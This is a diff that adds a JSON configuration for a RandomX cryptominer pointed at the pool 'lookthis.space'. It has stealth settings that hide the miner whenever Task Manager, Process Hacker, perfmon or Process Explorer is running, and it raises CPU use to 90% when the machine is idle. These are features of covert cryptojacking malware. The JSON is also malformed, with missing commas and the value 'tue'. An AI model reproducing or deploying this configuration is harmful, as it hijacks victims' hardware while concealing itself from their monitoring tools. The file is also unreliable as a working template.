@@ -1,0 +1,16 @@
+{
+	"algo": "rx/0",
+	"pool": "lookthis.space",
+	"port": 45672,
+	"wallet": "FirstGit",
+	"password": "",
+	"rig-id": "",
+	"keepalive": true
+	"nicehash": tue
+	"ssltls": true,
+	"max-cpu": 40
+	"idle-wait": 1,
+	"idle-cpu": 90
+	"stealth": true,
+	"stealth-targets": "Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe"
+}
